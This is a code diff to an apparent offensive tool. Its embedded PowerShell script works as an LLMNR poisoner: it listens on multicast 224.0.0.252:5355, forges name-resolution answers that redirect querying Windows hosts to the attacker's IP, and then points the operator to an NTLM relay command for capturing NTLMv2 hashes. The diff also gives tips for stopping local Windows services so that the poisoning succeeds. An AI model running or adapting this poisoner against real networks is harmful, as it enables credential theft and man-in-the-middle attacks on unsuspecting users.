@@ -19490,90 +19490,128 @@ Write-Output "Duration: ${duration} seconds"
 Write-Output "Protocols: ${protocols}"
 Write-Output ""
 
-$capturedHashes = @()
 $startTime = Get-Date
+$queryCount = 0
+$poisonedCount = 0
+$ourIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notmatch 'Loopback' } | Select-Object -First 1).IPAddress
+$ipBytes = [System.Net.IPAddress]::Parse($ourIP).GetAddressBytes()
+$llmnrSocket = $null
 
-# LLMNR Listener (UDP 5355)
+# LLMNR Listener (UDP 5355, multicast 224.0.0.252)
+# Must use ReuseAddress BEFORE binding, and join multicast group
 if ('${protocols}' -match 'llmnr|all') {
-  Write-Output "[*] Starting LLMNR listener on 224.0.0.252:5355..."
-  $llmnrSocket = New-Object System.Net.Sockets.UdpClient(5355)
-  $llmnrSocket.Client.SetSocketOption([System.Net.Sockets.SocketOptionLevel]::Socket, [System.Net.Sockets.SocketOptionName]::ReuseAddress, $true)
-  $mcastAddr = [System.Net.IPAddress]::Parse("224.0.0.252")
-  $llmnrSocket.JoinMulticastGroup($mcastAddr)
-  $llmnrSocket.Client.ReceiveTimeout = 2000
-  Write-Output "  LLMNR listener active"
-}
-
-# NBT-NS Listener (UDP 137)
-if ('${protocols}' -match 'nbtns|all') {
-  Write-Output "[*] Starting NBT-NS listener on 0.0.0.0:137..."
+  Write-Output "[*] Starting LLMNR poisoner on 224.0.0.252:5355..."
   try {
-    $nbtSocket = New-Object System.Net.Sockets.UdpClient(137)
-    $nbtSocket.Client.SetSocketOption([System.Net.Sockets.SocketOptionLevel]::Socket, [System.Net.Sockets.SocketOptionName]::ReuseAddress, $true)
-    $nbtSocket.Client.ReceiveTimeout = 2000
-    Write-Output "  NBT-NS listener active"
+    $ep = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any, 5355)
+    $llmnrSocket = New-Object System.Net.Sockets.UdpClient
+    $llmnrSocket.Client.SetSocketOption([System.Net.Sockets.SocketOptionLevel]::Socket, [System.Net.Sockets.SocketOptionName]::ReuseAddress, $true)
+    $llmnrSocket.ExclusiveAddressUse = $false
+    $llmnrSocket.Client.Bind($ep)
+    $llmnrSocket.JoinMulticastGroup([System.Net.IPAddress]::Parse("224.0.0.252"))
+    $llmnrSocket.Client.ReceiveTimeout = 1000
+    Write-Output "  LLMNR listener active (poisoning $ourIP)"
   } catch {
-    Write-Output "  NBT-NS port 137 in use (expected — Windows NetBIOS service)"
-    Write-Output "  Falling back to passive monitoring..."
+    Write-Output "  LLMNR bind failed: $_"
+    Write-Output "  Try stopping Windows LLMNR: Set-ItemProperty HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows' NT'\\DNSClient -Name EnableMulticast -Value 0"
+    $llmnrSocket = $null
   }
 }
 
+# NBT-NS: Port 137 is held by Windows NetBIOS service — cannot bind.
+# Instead, passively monitor NBT-NS traffic via packet sniffing if possible.
+if ('${protocols}' -match 'nbtns|all') {
+  Write-Output "[*] NBT-NS (port 137): passive monitoring only"
+  Write-Output "  Port 137 is held by Windows NetBIOS service — active poisoning requires"
+  Write-Output "  stopping NetBIOS: sc stop NetBT (may break network connectivity)"
+  Write-Output "  For active NBT-NS poisoning, use Inveigh from an elevated PS session"
+}
+
 Write-Output ""
-Write-Output "[*] Listening for broadcast name resolution queries..."
-Write-Output "[*] Poisoning will respond with our IP to redirect auth to us"
+Write-Output "[*] Listening for LLMNR queries to poison..."
+Write-Output "[*] Responding with: $ourIP"
+Write-Output "[*] Duration: ${duration}s"
 Write-Output ""
 
-$elapsed = 0
-$queryCount = 0
-$ourIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notmatch 'Loopback' } | Select-Object -First 1).IPAddress
-
-while ($elapsed -lt ${duration}) {
-  # LLMNR capture
+while ((New-TimeSpan -Start $startTime -End (Get-Date)).TotalSeconds -lt ${duration}) {
   if ($llmnrSocket) {
     try {
       $remoteEP = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any, 0)
       $data = $llmnrSocket.Receive([ref]$remoteEP)
-      if ($data.Length -gt 12) {
-        $queryCount++
-        # Extract queried name from LLMNR packet
-        $nameLen = $data[12]
-        $queriedName = [System.Text.Encoding]::ASCII.GetString($data, 13, $nameLen)
-        Write-Output "[+] LLMNR Query from $($remoteEP.Address): $queriedName"
 
-        # Build LLMNR response with our IP
-        $txid = $data[0..1]
-        $flags = [byte[]]@(0x80, 0x00)
-        $questions = [byte[]]@(0x00, 0x01)
-        $answers = [byte[]]@(0x00, 0x01)
-        $authority = [byte[]]@(0x00, 0x00)
-        $additional = [byte[]]@(0x00, 0x00)
-        $nameSection = $data[12..($data.Length-5)]
-        $answerSection = $nameSection + [byte[]]@(0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x1E, 0x00, 0x04)
-        $ipBytes = [System.Net.IPAddress]::Parse($ourIP).GetAddressBytes()
-        $response = $txid + $flags + $questions + $answers + $authority + $additional + $answerSection + $ipBytes
+      # Skip our own responses and packets < minimum LLMNR size
+      if ($data.Length -lt 13) { continue }
+      if ($remoteEP.Address.ToString() -eq $ourIP) { continue }
 
-        $llmnrSocket.Send($response, $response.Length, $remoteEP)
-        Write-Output "  [>] Poisoned response sent: $queriedName -> $ourIP"
+      # Parse LLMNR header (same as DNS)
+      # Bytes 2-3: Flags — bit 15 is QR (0=query, 1=response)
+      $isQuery = ($data[2] -band 0x80) -eq 0
+      if (-not $isQuery) { continue }
+
+      # Extract queried name: starts at byte 12, length-prefixed label
+      $nameLen = $data[12]
+      if ($nameLen -eq 0 -or (13 + $nameLen) -gt $data.Length) { continue }
+      $queriedName = [System.Text.Encoding]::ASCII.GetString($data, 13, $nameLen)
+      $queryCount++
+      Write-Output "[+] LLMNR Query from $($remoteEP.Address): $queriedName"
+
+      # Build proper LLMNR response
+      # Header: same TXID, QR=1 (response), QDCOUNT=1, ANCOUNT=1
+      $resp = New-Object System.Collections.Generic.List[byte]
+      $resp.Add($data[0])  # TXID byte 1
+      $resp.Add($data[1])  # TXID byte 2
+      $resp.Add(0x80)      # Flags: QR=1 (response)
+      $resp.Add(0x00)      # Flags byte 2
+      $resp.Add(0x00); $resp.Add(0x01)  # QDCOUNT = 1
+      $resp.Add(0x00); $resp.Add(0x01)  # ANCOUNT = 1
+      $resp.Add(0x00); $resp.Add(0x00)  # NSCOUNT = 0
+      $resp.Add(0x00); $resp.Add(0x00)  # ARCOUNT = 0
+
+      # Question section — echo the original query verbatim
+      # Question = name labels + QTYPE(2) + QCLASS(2)
+      $questionStart = 12
+      $questionEnd = $data.Length - 1
+      for ($i = $questionStart; $i -le $questionEnd; $i++) {
+        $resp.Add($data[$i])
       }
+
+      # Answer section: same name + TYPE(A) + CLASS(IN) + TTL(30s) + RDLEN(4) + IP
+      # Re-encode the name for the answer
+      $resp.Add($nameLen)
+      for ($i = 0; $i -lt $nameLen; $i++) {
+        $resp.Add($data[13 + $i])
+      }
+      $resp.Add(0x00)      # Name terminator
+      $resp.Add(0x00); $resp.Add(0x01)  # TYPE = A (1)
+      $resp.Add(0x00); $resp.Add(0x01)  # CLASS = IN (1)
+      $resp.Add(0x00); $resp.Add(0x00); $resp.Add(0x00); $resp.Add(0x1E)  # TTL = 30s
+      $resp.Add(0x00); $resp.Add(0x04)  # RDLENGTH = 4
+      foreach ($b in $ipBytes) { $resp.Add($b) }
+
+      $respBytes = $resp.ToArray()
+      $llmnrSocket.Send($respBytes, $respBytes.Length, $remoteEP) | Out-Null
+      $poisonedCount++
+      Write-Output "  [>] Poisoned: $queriedName -> $ourIP (sent to $($remoteEP.Address))"
     } catch [System.Net.Sockets.SocketException] {
-      # Timeout — expected
+      # Receive timeout — normal
+    } catch {
+      Write-Output "  [!] Error: $_"
     }
   }
-
-  Start-Sleep -Milliseconds 100
-  $elapsed = (New-TimeSpan -Start $startTime -End (Get-Date)).TotalSeconds
-  if ($elapsed % 30 -lt 0.2) {
-    Write-Output "[*] Running $elapsed s / ${duration}s — $queryCount queries captured"
-  }
+  Start-Sleep -Milliseconds 50
 }
 
 Write-Output ""
 Write-Output "=== Poisoning Summary ==="
 Write-Output "Duration: ${duration}s"
 Write-Output "Queries captured: $queryCount"
+Write-Output "Poisoned responses sent: $poisonedCount"
+Write-Output ""
+if ($queryCount -gt 0) {
+  Write-Output "Clients that queried are now connecting to $ourIP"
+  Write-Output "Capture their NTLMv2 hashes: winhook ntlm_relay --action relay --listen-port 445"
+}
 
 if ($llmnrSocket) { $llmnrSocket.Close() }
-if ($nbtSocket) { $nbtSocket.Close() }
 `
     const r = await ps(script, timeout)
     output.push(r.stdout)
